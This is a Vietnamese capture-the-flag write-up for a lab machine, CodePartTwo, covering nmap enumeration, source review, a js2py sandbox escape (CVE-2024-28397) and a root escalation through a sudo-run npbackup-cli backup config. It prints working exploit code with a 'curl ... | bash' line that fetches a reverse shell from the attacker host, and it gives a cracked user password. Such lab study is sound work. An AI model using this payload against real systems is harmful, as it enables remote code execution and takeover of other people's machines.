![[Pasted image 20261111230600.png]]


# Véc tơ tấn công

app: phân tích code -> CVE-2024-28397 js2py escape -> RCE -> app
marco: system enumeration -> sqlite3 database -> marco md5-hashed password -> marco credentials
root: npbackup-cli có sudo privileged -> sửa config file -> backup lại được /root -> root rsa -> root.


# Enumeration with Nmap

```
# Nmap 7.95 scan initiated Wed Nov 11 23:04:24 2026 as: nmap -sC -sV -oN codep2.txt 10.129.232.59
Nmap scan report for 10.129.232.59
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 11 23:04:36 2026 -- 1 IP address (1 host up) scanned in 12.22 seconds

```

- Nhận xét:
	- cổng 22 chạy ssh: không có lỗ hổng gì đặc biệt
	- cổng 8000: đang chạy http gunicorn 20.0.4

# Web Enumeration


giao diện web
![[Pasted image 20261111230950.png]]


ta tải được source code và phân tích code của trang web


chúng ta có cấu trúc backend của trang web được viết bằng python
```python

from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory

from flask_sqlalchemy import SQLAlchemy

import hashlib

import js2py

import os

import json

  

js2py.disable_pyimport()

app = Flask(__name__)

app.secret_key = 'S3cr3tK3yC0d3PartTw0'

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

  

class User(db.Model):

id = db.Column(db.Integer, primary_key=True)

username = db.Column(db.String(80), unique=True, nullable=False)

password_hash = db.Column(db.String(128), nullable=False)

  

class CodeSnippet(db.Model):

id = db.Column(db.Integer, primary_key=True)

user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

code = db.Column(db.Text, nullable=False)

  

@app.route('/')

def index():

return render_template('index.html')

  

@app.route('/dashboard')

def dashboard():

if 'user_id' in session:

user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()

return render_template('dashboard.html', codes=user_codes)

return redirect(url_for('login'))

  

@app.route('/register', methods=['GET', 'POST'])

def register():

if request.method == 'POST':

username = request.form['username']

password = request.form['password']

password_hash = hashlib.md5(password.encode()).hexdigest()

new_user = User(username=username, password_hash=password_hash)

db.session.add(new_user)

db.session.commit()

return redirect(url_for('login'))

return render_template('register.html')

  

@app.route('/login', methods=['GET', 'POST'])

def login():

if request.method == 'POST':

username = request.form['username']

password = request.form['password']

password_hash = hashlib.md5(password.encode()).hexdigest()

user = User.query.filter_by(username=username, password_hash=password_hash).first()

if user:

session['user_id'] = user.id

session['username'] = username;

return redirect(url_for('dashboard'))

return "Invalid credentials"

return render_template('login.html')

  

@app.route('/logout')

def logout():

session.pop('user_id', None)

return redirect(url_for('index'))

  

@app.route('/save_code', methods=['POST'])

def save_code():

if 'user_id' in session:

code = request.json.get('code')

new_code = CodeSnippet(user_id=session['user_id'], code=code)

db.session.add(new_code)

db.session.commit()

return jsonify({"message": "Code saved successfully"})

return jsonify({"error": "User not logged in"}), 401

  

@app.route('/download')

def download():

return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

  

@app.route('/delete_code/<int:code_id>', methods=['POST'])

def delete_code(code_id):

if 'user_id' in session:

code = CodeSnippet.query.get(code_id)

if code and code.user_id == session['user_id']:

db.session.delete(code)

db.session.commit()

return jsonify({"message": "Code deleted successfully"})

return jsonify({"error": "Code not found"}), 404

return jsonify({"error": "User not logged in"}), 401

  

@app.route('/run_code', methods=['POST'])

def run_code():

try:

code = request.json.get('code')

result = js2py.eval_js(code)

return jsonify({'result': result})

except Exception as e:

return jsonify({'error': str(e)})

  

if __name__ == '__main__':

with app.app_context():

db.create_all()

app.run(host='0.0.0.0', debug=True)
```


đây là logic code exploit khá cao sử dụng js2py
![[Pasted image 20261111231758.png]]



về cơ bản là backend sử dụng js2py để chuyển mã javascript về mã python để thực thi trên back-end 



```

# requirement.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74

```


# Shell as app
ta thấy js2py phiên bản 0.74 và bị lỗ hổng RCE CVE-2024-28397

sử dụng script này

https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

```
// [+] command goes here:

let cmd = "curl http://10.10.14.154:9000/rev.sh | bash"

let hacked, bymarve, n11

let getattr, obj

  

hacked = Object.getOwnPropertyNames({})

bymarve = hacked.__getattribute__

n11 = bymarve("__getattribute__")

obj = n11("__class__").__base__

getattr = obj.__getattribute__

  

function findpopen(o) {

let result;

for(let i in o.__subclasses__()) {

let item = o.__subclasses__()[i]

if(item.__module__ == "subprocess" && item.__name__ == "Popen") {

return item

}

if(item.__name__ != "type" && (result = findpopen(item))) {

return result

}

}

}

  

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()

console.log(n11)

n11
```

push code lên và thực thi bạn sẽ được shell


![[Pasted image 20261111233036.png]]

# shell as marco
chúng ta phát hiện được database của back-end chứa password bị md5 hash của marco
![[Pasted image 20261111233435.png]]

-> marco:sweetangelbabylove

![[Pasted image 20261111233751.png]]
chúng ta có thể vào được marco ssh

# shell as root

![[Pasted image 20261111234203.png]]
phát hiện npbackup-cli chạy root


hmm chúng ta có config file
![[Pasted image 20261111234342.png]]


![[Pasted image 20261111234426.png]]
=> điều này có thể là tạo config riêng rồi để nó backup root => root ssh rsa key -> root.


![[Pasted image 20261111234727.png]]
thay đổi file config  rằng path backup là về root -> root backup



và chúng ta có root folder
![[Pasted image 20261111235241.png]]


dump ra
![[Pasted image 20261111235506.png]]


và.... lên được root
![[Pasted image 20261111235553.png]]



# Remediation


- Thiết lập sanitization và bộ lọc code phù hợp
- nâng cấp js2py
- nâng cấp mã hóa không chỉ sử dụng md5
- config sudoers phải được chặt chẽ hơn